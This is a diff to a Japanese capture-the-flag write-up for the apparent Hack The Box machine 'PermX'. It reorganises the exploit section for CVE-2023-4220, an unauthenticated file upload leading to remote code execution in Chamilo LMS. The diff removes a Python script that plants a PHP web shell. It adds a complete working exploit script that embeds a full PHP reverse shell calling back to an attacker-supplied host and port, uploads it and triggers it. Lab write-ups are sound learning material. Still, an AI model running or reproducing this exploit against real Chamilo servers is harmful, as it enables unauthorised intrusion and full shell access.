@@ -109,6 +109,8 @@ searchsploitで既知の脆弱性がないか調べてみると 1.11.14にRCEの
 
 # Exploit
 
+## 手動で行う
+
 まず `/main/inc/lib/javascript/bigupload/files/` フォルダがあることを確認する
 
 ![](screenshot/image-20240707140100866.png)
@@ -131,56 +133,6 @@ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
 
 ![](screenshot/image-20240707140914353.png)
 
-このCVEを自動化するスクリプトを作成した
-
-```python
-import requests
-import argparse
-
-def create_php_file():
-    php_code = '<?php system($_REQUEST["cmd"]); ?>'
-    with open('rce.php', 'w') as file:
-        file.write(php_code)
-    print('[+] PHP file created')
-
-def upload_file(url):
-    upload_url = f"{url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
-    files = {'bigUploadFile': open('rce.php', 'rb')}
-    response = requests.post(upload_url, files=files)
-    if response.status_code == 200:
-        print('[+] Upload Success!')
-    else:
-        print('[!] Upload Failed!')
-
-def send_request(url, cmd):
-    request_url = f"{url}/main/inc/lib/javascript/bigupload/files/rce.php?cmd={cmd}"
-    req = requests.get(request_url)
-    print('[+] Send Request\n')
-    print(req.text)
-
-def main():
-    parser = argparse.ArgumentParser(
-        prog='permx_exploit.py', 
-        usage='python3 permx_exploit.py -u <target url> -c <cmd>',
-        description='(CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution PoC', 
-        epilog='end', 
-        add_help=True,
-    )
-    parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')
-    args = parser.parse_args()
-
-    create_php_file()
-    upload_file(args.url)
-    send_request(args.url, args.cmd)
-
-if __name__ == '__main__':
-    main()
-
-```
-
-![](screenshot/image-20240714144531847.png)
-
 しかしこのスクリプトでリバースシェルをいくつか送信してみたが機能しなかった
 
 `php-reverse-shell.php` を使用する
@@ -192,6 +144,61 @@ if __name__ == '__main__':
 ![](screenshot/image-20240707141258164.png)
 
 シェルを取得できた
+
+## 自動でおこなう
+
+このCVEを自動化するスクリプトを作成した
+
+```python
+import requests
+import argparse
+
+def create_php_file(ip, port):
+    php_code = f"""<?php set_time_limit(0);$VERSION="1.0";$ip='{ip}';$port={port};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){{$pid=pcntl_fork();if($pid==-1){{printit("ERROR: Can't fork");exit(1);}}if($pid){{exit(0);}}if(posix_setsid()==-1){{printit("Error: Can't setsid()");exit(1);}}$daemon=1;}}else{{printit("WARNING: Failed to daemonise. This is quite common and not fatal.");}}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){{printit("$errstr ($errno)");exit(1);}}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){{printit("ERROR: Can't spawn shell");exit(1);}}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("Successfully opened reverse shell to $ip:$port");while(1){{if(feof($sock)){{printit("ERROR: Shell connection terminated");break;}}if(feof($pipes[1])){{printit("ERROR: Shell process terminated");break;}}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){{if($debug)printit("SOCK READ");$input=fread($sock,$chunk_size);if($debug)printit("SOCK: $input");fwrite($pipes[0],$input);}}if(in_array($pipes[1],$read_a)){{if($debug)printit("STDOUT READ");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT: $input");fwrite($sock,$input);}}if(in_array($pipes[2],$read_a)){{if($debug)printit("STDERR READ");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR: $input");fwrite($sock,$input);}}}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){{if(!$daemon){{print "$string\\n";}}}}?>"""
+    with open('reverse_shell.php', 'w') as file:
+        file.write(php_code)
+    print('[+] PHP file created')
+
+def upload_file(url):
+    upload_url = f"{url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
+    files = {'bigUploadFile': open('reverse_shell.php', 'rb')}
+    response = requests.post(upload_url, files=files)
+    if response.status_code == 200:
+        print('[+] Upload Success!')
+    else:
+        print('[!] Upload Failed!')
+
+def send_request(url):
+    request_url = f"{url}/main/inc/lib/javascript/bigupload/files/reverse_shell.php"
+    print('[+] Send Request')
+    req = requests.get(request_url)
+    print(req.text)
+
+def main():
+    parser = argparse.ArgumentParser(
+        prog='permx_exploit.py', 
+        usage='python3 permx_exploit.py -u <target url> -l <lhost> -p <lport>',
+        description='(CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution PoC', 
+        epilog='end', 
+        add_help=True,
+    )
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('-l', '--lhost', required=True, help='Local host IP')
+    parser.add_argument('-p', '--lport', required=True, help='Local port')
+    args = parser.parse_args()
+
+    create_php_file(args.lhost, args.lport)
+    upload_file(args.url)
+    send_request(args.url)
+
+if __name__ == '__main__':
+    main()
+
+```
+
+実行することでシェルを取得することができた
+
+![](screenshot/image-20240714162309382.png)
 
 # Privilege Escalation
 
